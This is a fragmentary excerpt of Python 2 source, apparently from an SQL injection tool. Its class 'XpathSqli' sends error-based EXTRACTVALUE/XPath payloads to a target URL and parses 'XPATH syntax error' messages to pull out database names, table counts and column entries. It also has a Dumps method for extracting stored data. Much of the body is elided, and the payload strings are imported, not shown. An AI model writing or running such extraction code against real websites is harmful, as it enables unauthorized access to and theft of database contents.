...
#######################################################
import os, re
from Payload.XpathPayloads import *
from _compat import (
					compat_request,
					compat_urlerr,
					compat_urlopen,
...
class XpathSqli:
		...
		if self._url and not self._data:
			...
			for itr in range(init, total):
				...
				try:
					...
					respdata = resp.read()
					if "XPATH syntax error: '~" in respdata:
						_dbn     = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
				...
				if not Query_Test:
					...
					if '0x72306f74' in tgt:
						...
						try:
							...
							if 'XPATH syntax error' in respdata:
								Query_Test = True
								Count = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
						...
						if not DQuery:
							...
							if '0x72306f74' in tgt:
								...
								try:
									...
									respdata = resp.read()
									if 'XPATH syntax error' in respdata:
										dbsName  = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
										DQuery = True
										if not self._session:
	...
	def Banner(self):
		...
		try:
			...
			try:
				...
				print '\n' + compat_color.fw + compat_color.sb + "["+compat_strftime("%H:%M:%S")+"] [INFO] target is not vulnerable to error-based (EXTRACTVALUE) injection try other techniques.."
	...
	def Dumps(self, Dbname=None, TblName=None, ColList=None):
		...
		if Dbname and TblName and ColList:
			...
			_nameList       = "entries of column(s) '%s' for table '%s' in database '%s'" % (_colN,TblName ,Dbname)
